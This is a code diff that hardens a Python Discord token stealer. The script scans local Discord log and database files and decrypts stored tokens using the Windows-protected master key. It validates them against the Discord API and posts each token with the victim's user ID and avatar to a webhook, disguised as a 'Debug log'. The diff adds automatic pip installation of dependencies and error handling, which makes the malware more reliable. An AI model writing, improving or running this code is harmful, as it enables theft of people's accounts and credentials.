@@ -1,14 +1,50 @@
+import sys
+import subprocess
+
+def install_and_import(package_name, import_name=None):
+    """
+    Attempts to import a module; if not found, installs the package using pip and then imports it.
+    
+    :param package_name: The pip package name.
+    :param import_name: The module name to import (if different from the package name).
+    """
+    try:
+        if import_name:
+            __import__(import_name)
+        else:
+            __import__(package_name)
+    except ImportError:
+        print(f"Package '{package_name}' not found. Installing...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
+        print(f"Package '{package_name}' installed successfully.")
+
+# Ensure dependencies are installed.
+install_and_import("requests")
+install_and_import("pycryptodome", "Crypto")
+install_and_import("pywin32")  # Note: We'll handle importing win32crypt separately.
+
+# Now that dependencies are installed, try importing win32crypt.
+try:
+    from win32crypt import CryptUnprotectData
+except ModuleNotFoundError:
+    print("Module 'win32crypt' not found. Running pywin32_postinstall to register modules...")
+    try:
+        subprocess.check_call([sys.executable, '-m', 'pywin32_postinstall', '-install'])
+    except subprocess.CalledProcessError as e:
+        sys.exit(f"pywin32_postinstall failed: {e}")
+    try:
+        from win32crypt import CryptUnprotectData
+    except ModuleNotFoundError:
+        sys.exit("Failed to import 'win32crypt' even after running pywin32_postinstall. Exiting.")
+
 import base64
 import json
 import os
 import re
 import requests
-import subprocess
-import sys
 import time
 
 from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
 
 class ExtractTokens:
     def __init__(self) -> None:
@@ -63,29 +99,61 @@ class ExtractTokens:
                 continue
             _discord = name.replace(" ", "").lower()
             if "cord" in path:
-                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): 
+                state_path = os.path.join(self.roaming, f"{_discord}", "Local State")
+                if not os.path.exists(state_path): 
                     print(f"Local State file not found for {name}")
                     continue
                 for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]: continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    file_path = os.path.join(path, file_name)
+                    try:
+                        with open(file_path, errors='ignore') as f:
+                            lines = [x.strip() for x in f.readlines() if x.strip()]
+                    except Exception as e:
+                        print(f"Could not read file {file_path}: {e}")
+                        continue
+
+                    for line in lines:
                         for y in re.findall(self.regexp_enc, line):
-                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
-                    
+                            try:
+                                encrypted_value = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
+                                master_key = self.get_master_key(state_path)
+                                token = self.decrypt_val(encrypted_value, master_key)
+                            except Exception as e:
+                                print(f"Error decrypting token: {e}")
+                                continue
+
                             if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                try:
+                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                except Exception as e:
+                                    print(f"Error validating token: {e}")
+                                    continue
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
                                     print(f"Token found: {token} for user ID {uid}")
-
             else:
                 for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]: continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    file_path = os.path.join(path, file_name)
+                    try:
+                        with open(file_path, errors='ignore') as f:
+                            lines = [x.strip() for x in f.readlines() if x.strip()]
+                    except Exception as e:
+                        print(f"Could not read file {file_path}: {e}")
+                        continue
+
+                    for line in lines:
                         for token in re.findall(self.regexp, line):
                             if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                try:
+                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
+                                except Exception as e:
+                                    print(f"Error validating token: {e}")
+                                    continue
                                 if uid not in self.uids:
                                     self.tokens.append(token)
                                     self.uids.append(uid)
@@ -107,13 +175,17 @@ class ExtractTokens:
         return decrypted_pass
 
     def get_master_key(self, path: str) -> bytes:
-        if not os.path.exists(path): return b''
-        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return b''
-        with open(path, "r", encoding="utf-8") as f:
-            c = f.read()
-        local_state = json.loads(c)
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-        return CryptUnprotectData(master_key, None, None, None, 0)[1]
+        if not os.path.exists(path):
+            return b''
+        try:
+            with open(path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+            return CryptUnprotectData(master_key, None, None, None, 0)[1]
+        except Exception as e:
+            print(f"Error getting master key from {path}: {e}")
+            return b''
+
 
 class FetchTokens:
     def __init__(self):
@@ -139,13 +211,14 @@ class FetchTokens:
                 avatar_emoji = "🖼️"
                 
                 # Create a clean, professional message using markdown and emojis
-                content = f"** Log for <@{user_id}> {username} **\n\n" \
-                          f"**User ID:** `{user_id}`\n" \
-                          f"**NS:** {nitro_emoji} {nitro}\n" \
-                          f"**Avatar:** {avatar_emoji} [Click here]({avatar})\n\n" \
-                          f"**Log Number:** `{token}`\n\n" \
+                content = (
+                    f"** Log for <@{user_id}> {username} **\n\n"
+                    f"**User ID:** `{user_id}`\n"
+                    f"**NS:** {nitro_emoji} {nitro}\n"
+                    f"**Avatar:** {avatar_emoji} [Click here]({avatar})\n\n"
+                    f"**Log Number:** `{token}`\n\n"
+                )
 
-                # This part simulates the outline or card-like appearance
                 embed = {
                     "title": f"Debug log for {username}",
                     "description": content,
@@ -153,9 +226,8 @@ class FetchTokens:
                     "footer": {"text": "Help Logs"}
                 }
 
-                # Format message data with user's avatar as the webhook avatar
                 data = {
-                    'content': None,  # No main content since we have an embed
+                    'content': None,
                     'embeds': [embed],
                     'username': username,
                     'user_id': user_id,
@@ -164,11 +236,9 @@ class FetchTokens:
                     'nitro': nitro
                 }
 
-                # Debugging: Print the data being sent
                 print(f"Preparing to send data: {json.dumps(data, indent=4)}")
 
                 if not raw_data:
-                    # Send the formatted message to the webhook
                     response = requests.post(webhook_url, json=data)
                     print(f"Response Status Code: {response.status_code}, Response Text: {response.text}")
 
